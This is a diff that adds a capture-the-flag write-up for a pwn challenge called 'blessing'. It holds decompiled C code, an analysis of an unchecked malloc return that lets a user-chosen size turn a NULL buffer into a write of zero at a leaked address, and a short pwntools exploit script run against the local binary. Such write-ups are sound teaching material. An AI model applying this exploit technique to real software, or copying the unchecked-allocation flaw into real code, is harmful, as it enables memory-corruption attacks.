@@ -1,0 +1,90 @@
+* Description
+
+In the realm of Eldoria, where warrior roam, the Dragon's Heart they seek, from bytes to byte's
+home. Through exploits and tricks, they boldly dare, to conquer Eldoria, with skill and flair.
+
+* Solution
+Run the program, *we'll get a leak of address*. and let's input the length of song, then give the
+content of it. Keep the leak of address in mind, let's load it to disassembler:
+#+begin_src c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  size_t size; // [rsp+8h] [rbp-28h] BYREF
+  unsigned __int64 i; // [rsp+10h] [rbp-20h]
+  _QWORD *v6; // [rsp+18h] [rbp-18h]
+  void *buf; // [rsp+20h] [rbp-10h]
+  unsigned __int64 v8; // [rsp+28h] [rbp-8h]
+
+  v8 = __readfsqword(0x28u);
+  setup();
+  banner();
+  size = 0;
+  v6 = malloc(0x30000u);
+  *v6 = 1;
+  printstr(
+    "In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gift!\n"
+    "\n"
+    "Please accept this: ");
+  printf("%p", v6);
+  sleep(1u);
+  for ( i = 0; i <= 0xD; ++i )
+  {
+    printf("\b \b");
+    usleep(60000u);
+  }
+  puts("\n");
+  printf(
+    "%s[%sBard%s]: Now, I want something in return...\n\nHow about a song?\n\nGive me the song's length: ",
+    "\x1B[1;34m",
+    "\x1B[1;32m",
+    "\x1B[1;34m");
+  __isoc99_scanf("%lu", &size);
+  buf = malloc(size);
+  printf("\n%s[%sBard%s]: Excellent! Now tell me the song: ", "\x1B[1;34m", "\x1B[1;32m", "\x1B[1;34m");
+  read(0, buf, size);
+  *(_QWORD *)((char *)buf + size - 1) = 0;
+  write(1, buf, size);
+  if ( *v6 )
+    printf("\n%s[%sBard%s]: Your song was not as good as expected...\n\n", "\x1B[1;31m", "\x1B[1;32m", "\x1B[1;31m");
+  else
+    read_flag();
+  return 0;
+}
+#+end_src
+
+Obviously, the program do following thing:
+1. ~malloc~ a large chunk memory, then initialize =QWORD= byte with 0.
+2. leak that chunk memory address to us.
+3. use ~scanf~ to get the size of song.
+4. ~malloc~ with the =user control= size.
+5. ~read~ data into that memory return by above ~malloc~, without arguments check.
+6. initialize the (memory_addr + user control size - 1) = 0.
+7. check first ~malloc~ memory's initialzation is still work.
+   
+Our goal is to overwrite the memory of ~v6~ with 0. according to the behavior of the program, there
+only one place that would be leveraged:
+#+begin_src c
+*(_QWORD *)((char *)buf + size - 1) = 0;
+#+end_src
+the ~size~ variable's value can be controlled by us, and ~buf~ is return value within that ~size~. And
+there is no checking for ~buf~'s value.
+
+So, we only need to make ~buf~'s value equal to zero, and ~size - 1~ equal to the leak address.
+
+#+begin_src python :results output
+#!/usr/bin/env python3
+
+from pwn import *
+
+io = process('./blessing')
+
+_ = io.recvuntil(b'accept this: ')
+leak_addr = int(io.recvline().split(b'\x08\x20\x08')[0], 16)
+
+print(f'leak address: {hex(leak_addr)}, {leak_addr}')
+
+_ = io.sendlineafter(b'length: ', str(leak_addr + 1).encode())
+io.sendline() # for content
+_ = io.recvuntil(b'tell me the song: ')
+print(io.readline()[:-1].decode())
+#+end_src
